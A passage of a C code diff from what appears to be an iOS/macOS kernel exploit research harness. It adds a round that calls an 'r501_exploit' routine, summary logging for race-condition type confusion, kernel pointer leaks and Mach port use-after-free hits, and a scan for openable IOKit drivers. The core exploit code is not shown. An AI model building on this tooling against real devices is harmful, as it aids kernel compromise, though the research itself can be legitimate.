+            snprintf(status, sizeof(status), "OPEN conn=0x%x", dc);
+            IOServiceClose(dc);
+        } else if (kr == 0xe00002c1) {
+            snprintf(status, sizeof(status), "no-priv");
+        } else if (kr == 0xe00002c2) {
+            snprintf(status, sizeof(status), "not-permitted");
+        } else {
+            snprintf(status, sizeof(status), "kr=0x%x", kr);
+        }
+        rlog("    %-35s svc=0x%04x %s\n", drivers[i], dsvc, status);
+        IOObjectRelease(dsvc);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r501 Summary ===\n");
+    rlog("Phase 1: prop race anomalies=%d type_confusion=%d kptrs=%d\n",
+         (int)p1_anomalies, (int)p1_type_confusion, (int)p1_kptrs);
+    rlog("Phase 1b: mixed type_mismatch=%d kptrs=%d\n",
+         (int)p1b_type_mismatch, (int)p1b_kptrs);
+    rlog("Phase 2: mach port race uaf=%d double_lookup=%d\n",
+         (int)p2_uaf_hits, (int)p2_double_lookup);
+    rlog("Phase 3: ANE driver: %s\n", ane_found ? ane_found : "none accessible");
+    rlog("Phase 5: See timing/stats above\n");
+    rlog("Phase 6: See driver scan above\n");
+    rlog("=== r501 complete ===\n\n");
     fflush(stdout);
 }
 
@@ -98788,6 +99525,12 @@ new_modes:
             r501_exploit();
             goto done;
         }
+        if (rounds == 505) {
+            rlog("*** rounds=505: Multi-vector attack surface probe ***\n\n");
+            fflush(stdout);
+            r501_exploit();
+            goto done;
+        }
         if (rounds == 504) {
             rlog("*** rounds=504: sel19 deep probe + MaxQP=0 extra-byte analysis ***\n\n");
             fflush(stdout);
@@ -101821,7 +102564,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 505 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
